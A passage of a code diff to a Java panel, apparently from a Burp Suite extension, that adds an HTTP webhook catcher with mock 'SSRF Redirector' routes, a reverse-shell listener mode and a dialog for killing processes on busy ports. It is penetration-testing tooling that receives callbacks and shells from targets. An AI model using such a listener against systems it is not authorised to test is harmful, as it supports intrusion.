+            }
+        }
+
+        if (contentLength > 0) {
+            char[] body = new char[contentLength];
+            int read = 0;
+            while (read < contentLength) {
+                int r = reader.read(body, read, contentLength - read);
+                if (r == -1) break;
+                read += r;
+            }
+            reqBuilder.append(body, 0, read);
+        }
+
+        String clientIp = client.getInetAddress().getHostAddress();
+
+        // Build and write custom response with rich telemetry and routing
+        byte[] responseBytes = webhookConfig.buildResponseBytes(clientIp, method, path, port, reqBuilder.toString(), contentLength);
+        client.getOutputStream().write(responseBytes);
+        client.getOutputStream().flush();
+
+        if (!path.equals("/favicon.ico")) {
+            byte[] reqBytes = reqBuilder.toString().getBytes(StandardCharsets.UTF_8);
+
+            String host = "localhost";
+            int reqPort = port;
+            if (hostHeader.contains(":")) {
+                String[] hp = hostHeader.split(":");
+                host = hp[0];
+                try { reqPort = Integer.parseInt(hp[1]); } catch (NumberFormatException ignored) {}
+            } else if (!hostHeader.isEmpty()) {
+                host = hostHeader;
+            }
+
+            IHttpService service = new HttpServiceImpl(host, reqPort, "http");
+            addWebhookEntry(method, path, clientIp, reqBytes.length, reqBytes, responseBytes, service);
+        }
+    }
+
+    private void addWebhookEntry(String method, String url, String clientIp, int size, byte[] reqBytes, byte[] respBytes, IHttpService service) {
+        SwingUtilities.invokeLater(() -> {
+            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
+            RequestEntry entry = new RequestEntry(requestHistory.size() + 1, method, url, clientIp, size, timestamp, reqBytes, respBytes, service);
+            requestHistory.add(entry);
+            webhookTableModel.addRow(new Object[] { entry.index, entry.method, entry.url, entry.clientIp, entry.size + " B", entry.timestamp });
+
+            int last = webhookTableModel.getRowCount() - 1;
+            int viewRow = webhookTable.convertRowIndexToView(last);
+            if (viewRow >= 0) {
+                webhookTable.setRowSelectionInterval(viewRow, viewRow);
+                requestViewer.setMessage(reqBytes != null ? reqBytes : new byte[0], true);
+                responseViewer.setMessage(respBytes != null ? respBytes : new byte[0], false);
+            }
+            clearHistoryButton.setEnabled(true);
+        });
+    }
+
+    private void stopListener() {
+        isListening = false;
+        if (serverSocket != null && !serverSocket.isClosed()) {
+            try { serverSocket.close(); } catch (IOException ignored) {}
+        }
+        if (listenerThread != null) {
+            listenerThread.interrupt();
+        }
+
+        SwingUtilities.invokeLater(() -> {
+            startButton.setEnabled(true);
+            stopButton.setEnabled(false);
+            portField.setEnabled(true);
+            modeCombo.setEnabled(true);
+            tlsCheckBox.setEnabled(true);
+            currentPort = -1;
+            statusField.setText("OFFLINE");
+            statusField.setBackground(UITheme.STATUS_DANGER);
+            clearIpDisplay();
+            vpnWarningLabel.setText(" ");
+            shellStatusLabel.setText("STATUS: LISTENER STOPPED");
+        });
+    }
+
+    private void clearHistory() {
+        requestHistory.clear();
+        webhookTableModel.setRowCount(0);
+        requestViewer.setMessage(new byte[0], true);
+        responseViewer.setMessage(new byte[0], false);
+        clearHistoryButton.setEnabled(false);
+    }
+
+    // =========================================================================
+    // POPUP DIALOGS: MOCK ROUTES, RESPONSE CONFIG & KILL PORTS
+    // =========================================================================
+    private void showMockRoutesDialog() {
+        JDialog dialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Mock Endpoint Routes & SSRF Redirector", Dialog.ModalityType.APPLICATION_MODAL);
+        dialog.setLayout(new BorderLayout(10, 10));
+        dialog.setSize(750, 450);
+        dialog.setLocationRelativeTo(this);
+
+        String[] cols = { "Enabled", "Path", "Match Type", "Status", "Content-Type", "Description" };
+        DefaultTableModel model = new DefaultTableModel(cols, 0) {
+            @Override public Class<?> getColumnClass(int col) { return col == 0 ? Boolean.class : String.class; }
+            @Override public boolean isCellEditable(int row, int col) { return col == 0; }
+        };
+
+        List<MockRoute> routes = webhookConfig.getMockRoutes();
+        for (MockRoute r : routes) {
+            model.addRow(new Object[] { r.isEnabled(), r.getPath(), r.getMatchType().getDisplayName(), r.getStatusCode(), r.getContentType(), r.getDescription() });
+        }
+
+        JTable table = new JTable(model);
+        table.setFont(UITheme.FONT_CODE);
+        table.setRowHeight(24);
+        table.getColumnModel().getColumn(0).setMaxWidth(60);
+
+        model.addTableModelListener(e -> {
+            int row = e.getFirstRow();
+            if (row >= 0 && row < routes.size()) {
+                boolean enabled = (Boolean) model.getValueAt(row, 0);
+                routes.get(row).setEnabled(enabled);
+            }
+        });
+
+        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 8));
+        ModernButton addBtn = new ModernButton("ADD ROUTE", UITheme.STATUS_SUCCESS);
+        ModernButton removeBtn = new ModernButton("DELETE ROUTE", UITheme.STATUS_DANGER);
+        ModernButton closeBtn = new ModernButton("CLOSE", new Color(100, 116, 139));
+
+        addBtn.addActionListener(e -> {
+            String path = JOptionPane.showInputDialog(dialog, "Enter Route Path (e.g. /my-redirect or /api/data):", "/custom-endpoint");
+            if (path != null && !path.trim().isEmpty()) {
+                MockRoute newRoute = new MockRoute(path.trim(), MockRoute.MatchType.EXACT, "200 OK", "application/json", "{\"status\":\"ok\"}", "", "Custom Mock Endpoint");
+                webhookConfig.addMockRoute(newRoute);
+                model.addRow(new Object[] { newRoute.isEnabled(), newRoute.getPath(), newRoute.getMatchType().getDisplayName(), newRoute.getStatusCode(), newRoute.getContentType(), newRoute.getDescription() });
+            }
+        });
+
+        removeBtn.addActionListener(e -> {
+            int row = table.getSelectedRow();
+            if (row >= 0 && row < routes.size()) {
+                webhookConfig.removeMockRoute(routes.get(row));
+                model.removeRow(row);
+            }
+        });
+
+        closeBtn.addActionListener(e -> dialog.dispose());
+
+        btnPanel.add(addBtn);
+        btnPanel.add(removeBtn);
+        btnPanel.add(closeBtn);
+
+        dialog.add(new JScrollPane(table), BorderLayout.CENTER);
+        dialog.add(btnPanel, BorderLayout.SOUTH);
+        dialog.setVisible(true);
+    }
+
+    private void showResponseConfigDialog() {
+        JDialog dialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Configure HTTP Webhook Response", Dialog.ModalityType.APPLICATION_MODAL);
+        dialog.setLayout(new BorderLayout(10, 10));
+        dialog.setSize(550, 420);
+        dialog.setLocationRelativeTo(this);
+
+        JPanel form = new JPanel(new GridBagLayout());
+        form.setBorder(new EmptyBorder(14, 14, 14, 14));
+        GridBagConstraints gbc = new GridBagConstraints();
+        gbc.insets = new Insets(5, 5, 5, 5);
+        gbc.fill = GridBagConstraints.HORIZONTAL;
+
+        // Status Code
+        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
+        form.add(new JLabel("Status Code:"), gbc);
+        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 1.0;
+        JComboBox<String> statusCombo = new JComboBox<>(new String[] {
+                "200 OK", "201 Created", "204 No Content", "301 Moved Permanently",
+                "302 Found", "400 Bad Request", "401 Unauthorized", "403 Forbidden",
+                "404 Not Found", "500 Internal Server Error"
+        });
+        statusCombo.setSelectedItem(webhookConfig.getStatusCode());
+        form.add(statusCombo, gbc);
+
+        // Content Type
+        gbc.gridx = 0; gbc.gridy = 1; gbc.weightx = 0.0;
+        form.add(new JLabel("Content-Type:"), gbc);
+        gbc.gridx = 1; gbc.gridy = 1; gbc.weightx = 1.0;
+        JComboBox<String> ctCombo = new JComboBox<>(new String[] {
+                "text/html; charset=utf-8", "application/json; charset=utf-8",
+                "text/plain; charset=utf-8", "application/xml", "image/png"
+        });
+        ctCombo.setEditable(true);
+        ctCombo.setSelectedItem(webhookConfig.getContentType());
+        form.add(ctCombo, gbc);
+
+        // CORS
+        gbc.gridx = 0; gbc.gridy = 2; gbc.weightx = 0.0;
+        form.add(new JLabel("CORS Headers:"), gbc);
+        gbc.gridx = 1; gbc.gridy = 2; gbc.weightx = 1.0;
+        JCheckBox corsBox = new JCheckBox("Enable Access-Control-Allow-Origin: *", webhookConfig.isEnableCors());
+        form.add(corsBox, gbc);
+
+        // Response Body
+        gbc.gridx = 0; gbc.gridy = 3; gbc.weightx = 0.0;
+        form.add(new JLabel("Response Body:"), gbc);
+        gbc.gridx = 1; gbc.gridy = 3; gbc.weightx = 1.0; gbc.weighty = 1.0; gbc.fill = GridBagConstraints.BOTH;
+        JTextArea bodyArea = new JTextArea(webhookConfig.getResponseBody(), 6, 30);
+        bodyArea.setFont(UITheme.FONT_CODE);
+        form.add(new JScrollPane(bodyArea), gbc);
+
+        // Buttons
+        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 8));
+        ModernButton saveBtn = new ModernButton("SAVE CONFIGURATION", UITheme.STATUS_SUCCESS);
+        ModernButton cancelBtn = new ModernButton("CANCEL", new Color(100, 116, 139));
+
+        saveBtn.addActionListener(e -> {
+            webhookConfig.setStatusCode((String) statusCombo.getSelectedItem());
+            webhookConfig.setContentType((String) ctCombo.getSelectedItem());
+            webhookConfig.setEnableCors(corsBox.isSelected());
+            webhookConfig.setResponseBody(bodyArea.getText());
+            dialog.dispose();
+            JOptionPane.showMessageDialog(this, "Webhook response configuration updated.", "Saved", JOptionPane.INFORMATION_MESSAGE);
+        });
+        cancelBtn.addActionListener(e -> dialog.dispose());
+
+        btnPanel.add(saveBtn);
+        btnPanel.add(cancelBtn);
+
+        dialog.add(form, BorderLayout.CENTER);
+        dialog.add(btnPanel, BorderLayout.SOUTH);
+        dialog.setVisible(true);
+    }
+
+    private void killUsedPorts() {
+        killPortsButton.setEnabled(false);
+        ioExecutor.submit(() -> {
+            List<PortInfo> usedPorts = PortScanner.getUsedPorts();
+            SwingUtilities.invokeLater(() -> {
+                killPortsButton.setEnabled(true);
+                if (usedPorts.isEmpty()) {
+                    JOptionPane.showMessageDialog(this, "No active TCP listening ports detected.", "Scan Result", JOptionPane.INFORMATION_MESSAGE);
+                    return;
+                }
+                showKillPortsDialog(usedPorts);
+            });
+        });
+    }
+
+    private void showKillPortsDialog(List<PortInfo> usedPorts) {
+        JDialog dialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Kill Busy Listening Ports", Dialog.ModalityType.APPLICATION_MODAL);
+        dialog.setLayout(new BorderLayout(10, 10));
+        dialog.setSize(620, 380);
+        dialog.setLocationRelativeTo(this);
+
+        String[] columns = { "Select", "Port", "Protocol", "Local Address", "PID", "Process Name" };
+        DefaultTableModel model = new DefaultTableModel(columns, 0) {
+            @Override public Class<?> getColumnClass(int col) { return col == 0 ? Boolean.class : String.class; }
+            @Override public boolean isCellEditable(int row, int col) { return col == 0; }
+        };
+
+        for (PortInfo p : usedPorts) {
+            boolean isCurrent = (p.getPort() == currentPort);
+            model.addRow(new Object[] { isCurrent, p.getPort(), p.getProtocol(), p.getLocalAddress(), p.getPid() != -1 ? p.getPid() : "N/A", p.getProcessName() });
+        }
+
+        JTable table = new JTable(model);
+        table.setFont(UITheme.FONT_CODE);
+        table.setRowHeight(24);
+        table.getColumnModel().getColumn(0).setMaxWidth(50);
+
+        JPanel footer = new JPanel(new BorderLayout());
+        footer.setBorder(new EmptyBorder(8, 14, 8, 14));
+
+        JLabel warning = new JLabel("Terminating processes will immediately release the bound ports.");
+        warning.setFont(UITheme.FONT_SMALL);
+        warning.setForeground(UITheme.STATUS_DANGER);
+
+        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
+        ModernButton killBtn = new ModernButton("TERMINATE SELECTED", UITheme.STATUS_DANGER);
+        ModernButton cancelBtn = new ModernButton("CANCEL", new Color(100, 116, 139));
+
+        killBtn.addActionListener(e -> {
+            List<Integer> pids = new ArrayList<>();
+            List<Integer> ports = new ArrayList<>();
+            boolean currentSelected = false;
+
+            for (int i = 0; i < model.getRowCount(); i++) {
+                if ((Boolean) model.getValueAt(i, 0)) {
+                    int pt = (Integer) model.getValueAt(i, 1);
+                    String pidStr = String.valueOf(model.getValueAt(i, 4));
+                    int pid = pidStr.equals("N/A") ? -1 : Integer.parseInt(pidStr);
+                    if (pt == currentPort) currentSelected = true;
+                    if (pid != -1) {
+                        pids.add(pid);
+                        ports.add(pt);
+                    }
+                }
+            }
+
+            if (pids.isEmpty() && !currentSelected) {
+                JOptionPane.showMessageDialog(dialog, "Please select at least one process to terminate.", "No Selection", JOptionPane.WARNING_MESSAGE);
+                return;
+            }
+
+            final boolean killCurrent = currentSelected;
+            killBtn.setEnabled(false);
+            ioExecutor.submit(() -> {
+                StringBuilder sb = new StringBuilder();
+                if (killCurrent) {
+                    stopListener();
+                    sb.append("Active listener on port ").append(currentPort).append(" stopped.\n");
+                }
+                for (int i = 0; i < pids.size(); i++) {
+                    int pid = pids.get(i);
+                    int port = ports.get(i);
+                    boolean ok = PortScanner.killProcess(pid);
+                    sb.append("Port ").append(port).append(" (PID ").append(pid).append("): ")
+                            .append(ok ? "Terminated successfully" : "Failed to terminate").append("\n");
+                }
+                SwingUtilities.invokeLater(() -> {
+                    JOptionPane.showMessageDialog(this, sb.toString(), "Process Termination Results", JOptionPane.INFORMATION_MESSAGE);
+                    dialog.dispose();
+                });
+            });
+        });
+
+        cancelBtn.addActionListener(e -> dialog.dispose());
+        btnPanel.add(killBtn);
+        btnPanel.add(cancelBtn);
+
+        footer.add(warning, BorderLayout.WEST);
+        footer.add(btnPanel, BorderLayout.EAST);
+
+        dialog.add(new JScrollPane(table), BorderLayout.CENTER);
+        dialog.add(footer, BorderLayout.SOUTH);
+        dialog.setVisible(true);
+    }
+
+    // =========================================================================
+    // NETWORK INTERFACE HELPERS
+    // =========================================================================
     private List<String> getAvailableIpAddresses() {
-        List<String> ipAddresses = new ArrayList<>();
+        List<String> ips = new ArrayList<>();
         try {
             Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
             while (interfaces.hasMoreElements()) {
                 NetworkInterface iface = interfaces.nextElement();
-                // Skip loopback, virtual, and non-active interfaces
-                if (iface.isLoopback() || !iface.isUp() || iface.isVirtual()) {
-                    continue;
-                }
+                if (iface.isLoopback() || !iface.isUp() || iface.isVirtual()) continue;
                 Enumeration<InetAddress> addresses = iface.getInetAddresses();
                 while (addresses.hasMoreElements()) {
                     InetAddress addr = addresses.nextElement();
-                    // Only include IPv4 addresses for simplicity
-                    if (addr instanceof java.net.Inet4Address) {
-                        ipAddresses.add(addr.getHostAddress());
+                    if (addr instanceof Inet4Address) {
+                        ips.add(addr.getHostAddress());
                     }
                 }
             }
         } catch (SocketException e) {
             callbacks.printError("Error retrieving network interfaces: " + e.getMessage());
         }
-        return ipAddresses;
+        return ips;
     }
 
-    private void updateIpDisplay(List<String> ips, int port) {
+    private void updateIpDisplay(List<String> ips, int port, String mode, boolean useTls) {
         ipListPanel.removeAll();
-        List<String> entries = (ips == null || ips.isEmpty())
-                ? java.util.Collections.singletonList("127.0.0.1")
-                : ips;
+        List<String> entries = (ips == null || ips.isEmpty()) ? Collections.singletonList("127.0.0.1") : ips;
         for (String ip : entries) {
-            ipListPanel.add(makeIpChip(ip + ":" + port));
+            String displayText;
+            String copyValue;
+
+            if (useTls) {
+                displayText = "https://" + ip + ":" + port;
+                copyValue = "https://" + ip + ":" + port + "/";
+            } else {
+                if ("Reverse Shell".equals(mode)) {
+                    displayText = ip + ":" + port;
+                    copyValue = ip + ":" + port;
+                } else {
+                    displayText = "http://" + ip + ":" + port;
+                    copyValue = "http://" + ip + ":" + port + "/";
+                }
+            }
+
+            ipListPanel.add(new AddressChip(displayText, copyValue));
         }
         ipListPanel.revalidate();
         ipListPanel.repaint();
@@ -941,903 +1757,37 @@ public class ReverseShellReceiverPanel extends JPanel {
 
     private void clearIpDisplay() {
         ipListPanel.removeAll();
-        JLabel waiting = new JLabel("Waiting for listener to start...");
-        waiting.setFont(new Font("Segoe UI", Font.ITALIC, 11));
-        waiting.setForeground(new Color(175, 175, 175));
+        JLabel waiting = new JLabel("Listener is currently inactive.");
+        waiting.setFont(UITheme.FONT_SMALL);
+        waiting.setForeground(UITheme.TEXT_MUTED);
         ipListPanel.add(waiting);
         ipListPanel.revalidate();
         ipListPanel.repaint();
     }
 
-    private JPanel makeIpChip(String text) {
-        final Color normalBg = new Color(240, 244, 252);
-        final Color hoverBg  = new Color(224, 233, 248);
-        final Color copiedBg = new Color(228, 248, 236);
-
-        final Color normalBorder = new Color(212, 224, 244);
-        final Color hoverBorder  = new Color(180, 204, 240);
-        final Color copiedBorder = new Color(168, 224, 188);
-
-        final Color normalFg = new Color(44, 88, 160);
-        final Color copiedFg = new Color(36, 124, 72);
-
-        class ChipPanel extends JPanel {
-            private Color borderColor = normalBorder;
-
-            public ChipPanel() {
-                super(new FlowLayout(FlowLayout.LEFT, 10, 5));
-                setOpaque(false);
-            }
-
-            public void setBorderColor(Color color) {
-                this.borderColor = color;
-                repaint();
-            }
-
-            @Override
-            protected void paintComponent(Graphics g) {
-                Graphics2D g2 = (Graphics2D) g.create();
-                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
-
-                // Fill background
-                g2.setColor(getBackground());
-                g2.fillRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
-
-                // Draw border
-                g2.setColor(borderColor);
-                g2.setStroke(new BasicStroke(1.2f));
-                g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
-
-                g2.dispose();
-            }
+    private void populateIpAddresses(JComboBox<String> combo) {
+        combo.removeAllItems();
+        combo.addItem("127.0.0.1");
+        List<String> ips = getAvailableIpAddresses();
+        for (String ip : ips) {
+            combo.addItem(ip);
         }
-
-        ChipPanel chip = new ChipPanel();
-        chip.setBackground(normalBg);
-        chip.setCursor(new Cursor(Cursor.HAND_CURSOR));
-        chip.setToolTipText("Click to copy");
-        chip.setBorder(new EmptyBorder(1, 0, 1, 0));
-
-        JLabel ipText = new JLabel(text);
-        ipText.setFont(new Font("Consolas", Font.PLAIN, 12));
-        ipText.setForeground(normalFg);
-        ipText.setCursor(new Cursor(Cursor.HAND_CURSOR));
-        chip.add(ipText);
-
-        java.awt.event.MouseAdapter adapter = new java.awt.event.MouseAdapter() {
-            @Override
-            public void mouseClicked(java.awt.event.MouseEvent e) {
-                StringSelection sel = new StringSelection(text);
-                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, null);
-                chip.setBackground(copiedBg);
-                chip.setBorderColor(copiedBorder);
-                ipText.setForeground(copiedFg);
-
-                JWindow toast = new JWindow(SwingUtilities.getWindowAncestor(chip));
-                JLabel msg = new JLabel("  ✓  Copied: " + text + "  ");
-                msg.setFont(new Font("Segoe UI", Font.BOLD, 12));
-                msg.setForeground(Color.WHITE);
-                msg.setBackground(new Color(39, 174, 96));
-                msg.setOpaque(true);
-                msg.setBorder(new EmptyBorder(7, 12, 7, 12));
-                toast.getContentPane().add(msg);
-                toast.pack();
-                Point pt = e.getLocationOnScreen();
-                toast.setLocation(pt.x + 10, pt.y - toast.getHeight() - 4);
-                toast.setVisible(true);
-
-                Timer t = new Timer(1500, evt -> {
-                    toast.dispose();
-                    chip.setBackground(normalBg);
-                    chip.setBorderColor(normalBorder);
-                    ipText.setForeground(normalFg);
-                });
-                t.setRepeats(false);
-                t.start();
-            }
-            @Override public void mouseEntered(java.awt.event.MouseEvent e) {
-                if (!chip.getBackground().equals(copiedBg)) {
-                    chip.setBackground(hoverBg);
-                    chip.setBorderColor(hoverBorder);
-                }
-            }
-            @Override public void mouseExited(java.awt.event.MouseEvent e) {
-                if (!chip.getBackground().equals(copiedBg)) {
-                    chip.setBackground(normalBg);
-                    chip.setBorderColor(normalBorder);
-                }
-            }
-        };
-
-        chip.addMouseListener(adapter);
-        ipText.addMouseListener(adapter);
-        return chip;
+        if (!ips.isEmpty()) {
+            combo.setSelectedItem(ips.get(0));
+        }
     }
 
+    // =========================================================================
+    // SETTINGS & BURP EXTENSION INTEGRATION
+    // =========================================================================
     public void cleanup() {
         ioExecutor.shutdownNow();
         isListening = false;
         stopListener();
-        if (shellOut != null) {
-            shellOut.close();
-            shellOut = null;
-        }
-        if (clientSocket != null && !clientSocket.isClosed()) {
-            try {
-                clientSocket.close();
-            } catch (IOException e) {
-                // Ignore
-            }
-            clientSocket = null;
-        }
-        if (shellReaderThread != null && shellReaderThread.isAlive()) {
-            shellReaderThread.interrupt();
-            shellReaderThread = null;
-        }
-    }
-
-    private void stopListener() {
-        isListening = false;
-        // Socket/thread I/O runs synchronously on whichever non-EDT thread calls this
-        if (serverSocket != null && !serverSocket.isClosed()) {
-            try {
-                serverSocket.close();
-            } catch (IOException e) {
-                callbacks.printError("Error closing server socket: " + e.getMessage());
-            }
-        }
-        if (clientSocket != null && !clientSocket.isClosed()) {
-            try {
-                clientSocket.close();
-            } catch (IOException e) {
-                callbacks.printError("Error closing client socket: " + e.getMessage());
-            }
-        }
-        if (listenerThread != null) {
-            listenerThread.interrupt();
-        }
-        // All Swing updates must happen on the EDT
-        SwingUtilities.invokeLater(() -> {
-            startButton.setEnabled(true);
-            stopButton.setEnabled(false);
-            portField.setEnabled(true);
-            modeCombo.setEnabled(true);
-            currentPort = -1;
-            statusField.setText("OFFLINE");
-            statusField.setBackground(new Color(192, 57, 43));
-            statusField.setForeground(Color.WHITE);
-            clearIpDisplay();
-            vpnWarningLabel.setText(" ");
-            bottomPanel.setVisible(false);
-            inputField.setEnabled(false);
-            sendButton.setEnabled(false);
-            if (promptLabel != null) {
-                promptLabel.setText(" Command:");
-            }
-        });
-    }
-
-    private void killUsedPorts() {
-        killPortsButton.setEnabled(false);
-        ioExecutor.submit(() -> {
-            try {
-                List<PortInfo> usedPorts = getUsedPorts();
-                SwingUtilities.invokeLater(() -> {
-                    killPortsButton.setEnabled(true);
-                    if (usedPorts.isEmpty()) {
-                        JOptionPane.showMessageDialog(this, "No TCP ports are currently in use.", "No Ports Found",
-                                JOptionPane.INFORMATION_MESSAGE);
-                        return;
-                    }
-                    showKillPortsDialog(usedPorts);
-                });
-            } catch (Exception e) {
-                SwingUtilities.invokeLater(() -> {
-                    killPortsButton.setEnabled(true);
-                    JOptionPane.showMessageDialog(this, "Error scanning ports: " + e.getMessage(), "Error",
-                            JOptionPane.ERROR_MESSAGE);
-                });
-            }
-        });
-    }
-
-    private void showKillPortsDialog(List<PortInfo> usedPorts) {
-        // Create popup dialog
-        JDialog portDialog = new JDialog(SwingUtilities.getWindowAncestor(this), "Select Ports to Kill",
-                Dialog.ModalityType.APPLICATION_MODAL);
-        portDialog.setLayout(new BorderLayout(10, 10));
-        portDialog.setSize(600, 400);
-
-        // Table to display ports
-        String[] columns = { "Select", "Port", "Protocol", "Address", "PID", "Process" };
-        DefaultTableModel portTableModel = new DefaultTableModel(columns, 0) {
-            @Override
-            public Class<?> getColumnClass(int columnIndex) {
-                return columnIndex == 0 ? Boolean.class : String.class;
-            }
-
-            @Override
-            public boolean isCellEditable(int row, int column) {
-                return column == 0;
-            }
-        };
-
-        JTable portTable = new JTable(portTableModel);
-        portTable.setFillsViewportHeight(true);
-        portTable.setRowHeight(25);
-        portTable.getTableHeader().setReorderingAllowed(false);
-
-        // Refined column widths
-        portTable.getColumnModel().getColumn(0).setMaxWidth(50);
-        portTable.getColumnModel().getColumn(1).setPreferredWidth(60);
-        portTable.getColumnModel().getColumn(2).setPreferredWidth(70);
-        portTable.getColumnModel().getColumn(3).setPreferredWidth(140);
-        portTable.getColumnModel().getColumn(4).setPreferredWidth(60);
-        portTable.getColumnModel().getColumn(5).setPreferredWidth(180);
-
-        for (PortInfo portInfo : usedPorts) {
-            boolean isCurrentPort = portInfo.port == currentPort;
-            portTableModel.addRow(new Object[] {
-                    isCurrentPort,
-                    portInfo.port,
-                    portInfo.protocol,
-                    portInfo.localAddress,
-                    portInfo.pid != -1 ? portInfo.pid : "N/A",
-                    portInfo.processName != null ? portInfo.processName : "Unknown"
-            });
-        }
-
-        JScrollPane portScrollPane = new JScrollPane(portTable);
-        portScrollPane.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
-        portDialog.add(portScrollPane, BorderLayout.CENTER);
-
-        // Footer panel with warning and buttons
-        JPanel footerPanel = new JPanel(new BorderLayout());
-        footerPanel.setBorder(new EmptyBorder(10, 10, 10, 10));
-
-        JPanel warningPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 0, 0));
-        warningPanel.setOpaque(false);
-        JLabel titleLabel = new JLabel("Warning: ");
-        titleLabel.setForeground(new Color(231, 76, 60));
-        titleLabel.setFont(titleLabel.getFont().deriveFont(Font.BOLD));
-        JLabel msgLabel = new JLabel("Proceed with caution.");
-        msgLabel.setForeground(new Color(102, 102, 102));
-        warningPanel.add(titleLabel);
-        warningPanel.add(msgLabel);
-        footerPanel.add(warningPanel, BorderLayout.WEST);
-
-        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 10, 0));
-        JButton killButton = new JButton("Kill Selected");
-        JButton cancelButton = new JButton("Cancel");
-
-        // Style Buttons
-        killButton.setBackground(new Color(231, 76, 60));
-        killButton.setForeground(Color.WHITE);
-        killButton.setFocusPainted(false);
-
-        killButton.addActionListener(e -> {
-            boolean currentPortSelected = false;
-            List<Integer> pidsToKill = new ArrayList<>();
-            List<Integer> portsToKill = new ArrayList<>();
-            for (int i = 0; i < portTableModel.getRowCount(); i++) {
-                if ((Boolean) portTableModel.getValueAt(i, 0)) {
-                    int port = Integer.parseInt((String) portTableModel.getValueAt(i, 1));
-                    String pidStr = (String) portTableModel.getValueAt(i, 4);
-                    int pid = pidStr.equals("N/A") ? -1 : Integer.parseInt(pidStr);
-                    if (port == currentPort) {
-                        currentPortSelected = true;
-                    } else if (pid != -1) {
-                        pidsToKill.add(pid);
-                        portsToKill.add(port);
-                    }
-                }
-            }
-
-            if (pidsToKill.isEmpty() && !currentPortSelected) {
-                JOptionPane.showMessageDialog(portDialog, "No ports selected to kill.", "No Selection",
-                        JOptionPane.WARNING_MESSAGE);
-                return;
-            }
-
-            // Confirm action
-            int confirm = JOptionPane.showConfirmDialog(portDialog,
-                    "Are you sure you want to terminate the selected processes? This may disrupt running applications.",
-                    "Confirm Kill", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE);
-            if (confirm != JOptionPane.YES_OPTION) {
-                return;
-            }
-
-            final boolean finalCurrentPortSelected = currentPortSelected;
-            killButton.setEnabled(false);
-            ioExecutor.submit(() -> {
-                StringBuilder resultMessage = new StringBuilder();
-                if (finalCurrentPortSelected) {
-                    stopListener();
-                    resultMessage.append("Current listener on port ").append(currentPort).append(" stopped.\n");
-                }
-
-                // Kill other selected processes
-                for (int i = 0; i < pidsToKill.size(); i++) {
-                    int pid = pidsToKill.get(i);
-                    int port = portsToKill.get(i);
-                    boolean success = killProcess(pid);
-                    resultMessage.append("Port ").append(port).append(" (PID ").append(pid).append("): ")
-                            .append(success ? "Terminated successfully" : "Failed to terminate").append("\n");
-                }
-
-                SwingUtilities.invokeLater(() -> {
-                    JOptionPane.showMessageDialog(this, resultMessage.toString(), "Kill Ports Result",
-                            JOptionPane.INFORMATION_MESSAGE);
-                    portDialog.dispose();
-                });
-            });
-        });
-        cancelButton.addActionListener(e -> portDialog.dispose());
-
-        buttonPanel.add(killButton);
-        buttonPanel.add(cancelButton);
-        footerPanel.add(buttonPanel, BorderLayout.EAST);
-        portDialog.add(footerPanel, BorderLayout.SOUTH);
-
-        portDialog.setLocationRelativeTo(this);
-        portDialog.setVisible(true);
-    }
-
-    private List<PortInfo> getUsedPorts() {
-        List<PortInfo> usedPorts = new ArrayList<>();
-        String os = System.getProperty("os.name").toLowerCase();
-        try {
-            // Batch fetch process names for speed on Windows
-            Map<Integer, String> processMap = os.contains("win") ? getWindowsProcessMap() : new HashMap<>();
-
-            Process process = os.contains("win")
-                    ? new ProcessBuilder("cmd", "/c", "netstat -aon | findstr LISTENING").start()
-                    : new ProcessBuilder("netstat", "-tulnp").start();
-
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-                String line;
-                Pattern pattern = os.contains("win")
-                        ? Pattern.compile("\\s*TCP\\s+(\\S+):(\\d+)\\s+\\S+\\s+LISTENING\\s+(\\d+)")
-                        : Pattern.compile("tcp\\s+\\d+\\s+\\d+\\s+(\\S+):(\\d+)\\s+.*LISTEN\\s+(\\d+)/(\\S+)");
-
-                while ((line = reader.readLine()) != null) {
-                    Matcher matcher = pattern.matcher(line);
-                    if (matcher.find()) {
-                        String localAddress = matcher.group(1);
-                        int port = Integer.parseInt(matcher.group(2));
-                        int pid = matcher.group(3) != null ? Integer.parseInt(matcher.group(3)) : -1;
-
-                        String processName = "Unknown";
-                        if (os.contains("win")) {
-                            processName = processMap.getOrDefault(pid, "Unknown");
-                        } else if (matcher.groupCount() >= 4) {
-                            processName = matcher.group(4);
-                        }
-
-                        usedPorts.add(new PortInfo(port, "TCP", localAddress, pid, processName));
-                    }
-                }
-            }
-            process.waitFor();
-        } catch (IOException | InterruptedException e) {
-            callbacks.printError("Error retrieving used ports: " + e.getMessage());
-            SwingUtilities.invokeLater(() -> {
-                JOptionPane.showMessageDialog(this, "Failed to retrieve used ports: " + e.getMessage(),
-                        "Error", JOptionPane.ERROR_MESSAGE);
-            });
-        }
-        return usedPorts;
-    }
-
-    private Map<Integer, String> getWindowsProcessMap() {
-        Map<Integer, String> processMap = new HashMap<>();
-        try {
-            Process process = new ProcessBuilder("tasklist", "/fo", "csv", "/nh").start();
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    String[] parts = line.split("\",\"");
-                    if (parts.length >= 2) {
-                        try {
-                            String name = parts[0].replace("\"", "");
-                            String pidStr = parts[1].replace("\"", "");
-                            processMap.put(Integer.parseInt(pidStr), name);
-                        } catch (NumberFormatException e) {
-                            /* skip */ }
-                    }
-                }
-            }
-        } catch (IOException e) {
